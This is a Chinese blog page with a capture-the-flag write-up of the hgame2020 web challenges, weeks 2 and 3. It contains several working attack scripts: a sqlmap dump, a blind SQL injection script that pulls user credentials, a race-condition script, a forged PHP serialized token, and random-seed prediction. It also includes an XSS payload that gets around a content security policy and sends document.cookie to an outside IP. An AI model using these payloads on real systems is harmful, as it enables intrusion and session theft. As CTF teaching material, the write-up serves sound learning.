@@ -1,0 +1,1264 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/black/pace-theme-flash.css" rel="stylesheet">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon2.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon2.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="week2 Cosmos的博客后台 php伪协议拿源码, 审计:  通过debug拿到了用户名和密码, 弱类型比较特性, 只要md5值是0e开头就好, 比如QNKCDZO. 进入了admin.php  1file://localhost/flag cosmos 的留言板 1sudo sqlmap -u &amp;apos;http://139.199.182.61/index.php?id=1&amp;apos;">
+<meta name="keywords" content="CTF WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame2020">
+<meta property="og:url" content="http://yoursite.com/2020/02/23/hgame2020/index.html">
+<meta property="og:site_name" content="CH4SER || 自闭室">
+<meta property="og:description" content="week2 Cosmos的博客后台 php伪协议拿源码, 审计:  通过debug拿到了用户名和密码, 弱类型比较特性, 只要md5值是0e开头就好, 比如QNKCDZO. 进入了admin.php  1file://localhost/flag cosmos 的留言板 1sudo sqlmap -u &amp;apos;http://139.199.182.61/index.php?id=1&amp;apos;">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/image-20200124011213634.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200124011341049.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200124020611502.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200124020602334.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200130220909593.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200130225348166.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200201225116798.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200131130042294.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200208183220422.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200208183749901.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200208183736478.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200208183808012.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200210000240936.png">
+<meta property="og:image" content="http://yoursite.com/images/image-1582424130833.png__thumbnail">
+<meta property="og:image" content="http://yoursite.com/images/image-1582424145702.png__thumbnail">
+<meta property="og:image" content="http://yoursite.com/images/image.png__thumbnail">
+<meta property="og:updated_time" content="2020-02-23T02:16:12.268Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hgame2020">
+<meta name="twitter:description" content="week2 Cosmos的博客后台 php伪协议拿源码, 审计:  通过debug拿到了用户名和密码, 弱类型比较特性, 只要md5值是0e开头就好, 比如QNKCDZO. 进入了admin.php  1file://localhost/flag cosmos 的留言板 1sudo sqlmap -u &amp;apos;http://139.199.182.61/index.php?id=1&amp;apos;">
+<meta name="twitter:image" content="http://yoursite.com/images/image-20200124011213634.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/23/hgame2020/">
+
+
+
+
+
+  <title>hgame2020 | CH4SER || 自闭室</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CH4SER || 自闭室</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">志之难也,不在胜人,而在自胜.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/23/hgame2020/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ch4ser">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/dogdog.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CH4SER || 自闭室">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hgame2020</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-23T10:10:06+08:00">
+                2020-02-23
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2020-02-23T10:16:12+08:00">
+                2020-02-23
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1>week2</h1>
+<h2 id="Cosmos的博客后台">Cosmos的博客后台</h2>
+<p>php伪协议拿源码, 审计:</p>
+<p><img src="/images/image-20200124011213634.png" alt="image-20200124011213634"></p>
+<p>通过debug拿到了用户名和密码, 弱类型比较特性, 只要md5值是0e开头就好, 比如QNKCDZO.</p>
+<p>进入了admin.php</p>
+<p><img src="/images/image-20200124011341049.png" alt="image-20200124011341049"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://localhost/flag</span><br></pre></td></tr></table></figure>
+<h2 id="cosmos-的留言板">cosmos 的留言板</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sqlmap -u &apos;http://139.199.182.61/index.php?id=1&apos; -D easysql -T f1aggggggggggggg -C fl4444444g --dump --tamper space2randomblank.py</span><br></pre></td></tr></table></figure>
+<h2 id="cosmos-的新语言">cosmos 的新语言</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">letter_low = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">letter_high = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line"></span><br><span class="line">plain = <span class="string">"The quick brown fox jumps over 13 lazy dogs."</span></span><br><span class="line">secret = <span class="string">'Gur dhvpx oebja sbk whzcf bire 13 ynml qbtf.'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot_encrypt</span><span class="params">(plain)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> plain:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> letter_low:</span><br><span class="line">            result += letter_low[(letter_low.index(i) + <span class="number">13</span>) % <span class="number">26</span>]</span><br><span class="line">        <span class="keyword">elif</span> i <span class="keyword">in</span> letter_high:</span><br><span class="line">            result += letter_high[(letter_high.index(i) + <span class="number">13</span>) % <span class="number">26</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += i</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(secret)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        result += chr(ord(i) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://70db541271.php.hgame.n3ko.co/"</span></span><br><span class="line">res = requests.get(url).text</span><br><span class="line">pattern = re.compile(<span class="string">"&lt;/code&gt;&lt;br&gt;\n(.*?)&lt;br&gt;"</span>)</span><br><span class="line">secret = (pattern.findall(res)[<span class="number">0</span>])</span><br><span class="line">print(secret)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://70db541271.php.hgame.n3ko.co/mycode"</span></span><br><span class="line">res = requests.get(url).text</span><br><span class="line">pattern = re.compile(<span class="string">r"echo((.*?));"</span>);</span><br><span class="line">encrypto_mod = pattern.findall(res)[<span class="number">0</span>][<span class="number">0</span>].split(<span class="string">"("</span>)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">print(encrypto_mod)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> encrypto_mod:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">"base64_encode"</span>:</span><br><span class="line">        secret = base64.b64decode(secret.encode(<span class="string">'utf8'</span>)).decode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">"str_rot13"</span>:</span><br><span class="line">        secret = rot_encrypt(secret)</span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">"encrypt"</span>:</span><br><span class="line">        secret = decrypt(secret)</span><br><span class="line">    <span class="keyword">elif</span> i== <span class="string">"strrev"</span>:</span><br><span class="line">        secret = secret[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="string">"Error occured"</span>)</span><br><span class="line"></span><br><span class="line">print(secret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://70db541271.php.hgame.n3ko.co/"</span></span><br><span class="line">post_data = &#123;</span><br><span class="line">    <span class="string">'token'</span> :secret</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url, data=post_data).text</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+<h2 id="cosmos-的聊天室">cosmos 的聊天室</h2>
+<p><img src="/images/image-20200124020611502.png" alt="image-20200124020611502"></p>
+<p>再加一个注释符号就行了</p>
+<p><img src="/images/image-20200124020602334.png" alt="image-20200124020602334"></p>
+<h1>week3</h1>
+<h2 id="序列之争-Ordinal-Scale">序列之争 - Ordinal Scale</h2>
+<p><img src="/images/image-20200130220909593.png" alt="image-20200130220909593"></p>
+<p>得到了secretkey</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL</span><br></pre></td></tr></table></figure>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $rank;</span><br><span class="line">    <span class="keyword">private</span> $serverKey;     <span class="comment">// 服务器的 Key</span></span><br><span class="line">    <span class="keyword">private</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = &amp;<span class="keyword">$this</span>-&gt;serverKey;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Rank();</span><br><span class="line">$data = [<span class="string">'ch4ser'</span>, <span class="string">'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'</span>];</span><br><span class="line">$sign = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    $sign.=md5($sign.$value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//echo $sign;</span></span><br><span class="line">$sign = md5(serialize($a).$sign);</span><br><span class="line">$rank_monster = base64_encode(serialize($a).$sign);</span><br><span class="line"><span class="keyword">echo</span> $rank_monster;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20200130225348166.png" alt="image-20200130225348166"></p>
+<h2 id="二发入魂">二发入魂</h2>
+<p>随机数种子预测, 参考链接https://www.anquanke.com/post/id/196831#h3-5</p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://twoshot.hgame.n3ko.co/random.php?times=277"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=bk2doj0d4sbsj5nuf991g8qas2"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url, headers=headers).json()</span><br><span class="line"></span><br><span class="line">arg0 = res[<span class="number">0</span>]</span><br><span class="line">arg1 = res[<span class="number">227</span>]</span><br><span class="line"></span><br><span class="line">result = os.popen(<span class="string">'python3 reverse_mt_rand.py &#123;0&#125; &#123;1&#125; 0 0'</span>.format(arg0, arg1))</span><br><span class="line">res = result.read()</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://twoshot.hgame.n3ko.co/verify.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'ans'</span>:res</span><br><span class="line">&#125;</span><br><span class="line">result = requests.post(url, headers=headers,data=data)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20200201225116798.png" alt="image-20200201225116798"></p>
+<h2 id="Cosmos的二手市场">Cosmos的二手市场</h2>
+<p>条件竞争, 买一个东西拿来卖两次, 附上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://121.36.88.65:9999/API/?method="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(action)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url_buy = url + action</span><br><span class="line">        post_data = &#123;</span><br><span class="line">            <span class="string">"code"</span>:<span class="string">"800003"</span>,</span><br><span class="line">            <span class="string">"amount"</span>:<span class="string">"250"</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=4s8uu8ad0eqqcnskrna7s2gma9"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url_buy, data=post_data, headers=header)</span><br><span class="line">            print(res.text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_main</span><span class="params">(count)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(count*<span class="number">2</span>):</span><br><span class="line">        t = threading.Thread(target=action, args=(<span class="string">"solve"</span>,))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(count):</span><br><span class="line">        t = threading.Thread(target=action, args=(<span class="string">"buy"</span>,))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    thread_main(<span class="number">250</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20200131130042294.png" alt="image-20200131130042294"></p>
+<h2 id="cosmos-的留言板2">cosmos 的留言板2</h2>
+<p>盲注, 注入点在delete_id</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_mod = <span class="string">"http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=exp((select/**/case/**/when(&#123;0&#125;)then(99999)else(1)end))"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=s5kb5k11rm0lndtmgmib0vhg92"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload_mod = "ord(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload_mod = "ord(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name='user'),&#123;0&#125;,1))&gt;&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># id,name,password</span></span><br><span class="line">payload_mod = <span class="string">"ord(substr((select/**/group_concat(name,0x7e,password)from/**/user),&#123;0&#125;,1))&gt;&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># cosmos~f1FXOCnj26Fkadzt4Sqynf6O7CgR</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l_bound = <span class="number">0</span>; u_bound = <span class="number">255</span></span><br><span class="line">    <span class="keyword">while</span> l_bound &lt;= u_bound:</span><br><span class="line">        m_bound = (l_bound + u_bound) //<span class="number">2</span></span><br><span class="line">        payload = payload_mod.format(index, m_bound)</span><br><span class="line">        url = url_mod.format(payload)</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        </span><br><span class="line">        res = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"失败"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp = m_bound</span><br><span class="line">            u_bound = m_bound - <span class="number">1</span></span><br><span class="line">    result += chr(tmp)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+<p>拿到了密码, 登录就有flag</p>
+<h2 id="cosmos-的聊天室2-0">cosmos 的聊天室2.0</h2>
+<p>有csp在</p>
+<p><img src="/images/image-20200208183220422.png" alt="image-20200208183220422"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;; script-src &apos;self&apos;</span><br></pre></td></tr></table></figure>
+<p>这意味着内联脚本无法执行(如果可以执行的话<code>script-src</code>应该有<code>unsafe-inline</code>项)</p>
+<p>验证:</p>
+<p><img src="/images/image-20200208183749901.png" alt="image-20200208183749901"></p>
+<p><img src="/images/image-20200208183736478.png" alt="image-20200208183736478"></p>
+<p><img src="/images/image-20200208183808012.png" alt="image-20200208183808012"></p>
+<p><code>script-src 'self'</code>的意思就是只能从同源域中获取执行的脚本, 注意观察到每次请求<code>/send?message=xxxx</code>的时候会将message的内容进行一个回显, 所以可以构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scrscriptipt/src=&quot;/send?message=alert(1)&quot;&gt;&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure>
+<p>作为消息发送出去, 成功弹窗</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;scrscriptipt/src=&quot;/send?message=window.open(&apos;http://39.105.176.37:9999/?&apos;%2bdocument.cookie);&quot;&gt;&lt;/scrscriptipt&gt;</span><br><span class="line"></span><br><span class="line">%3c%73%63%72%73%63%72%69%70%74%69%70%74%2f%73%72%63%3d%22%2f%73%65%6e%64%3f%6d%65%73%73%61%67%65%3d%77%69%6e%64%6f%77%2e%6f%70%65%6e%28%27%68%74%74%70%3a%2f%2f%33%39%2e%31%30%35%2e%31%37%36%2e%33%37%3a%39%39%39%39%2f%3f%27%25%32%62%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3b%22%3e%3c%2f%73%63%72%73%63%72%69%70%74%69%70%74%3e</span><br></pre></td></tr></table></figure>
+<p>成功弹cookie, 注意加号需要url编码两次</p>
+<h1>week4</h1>
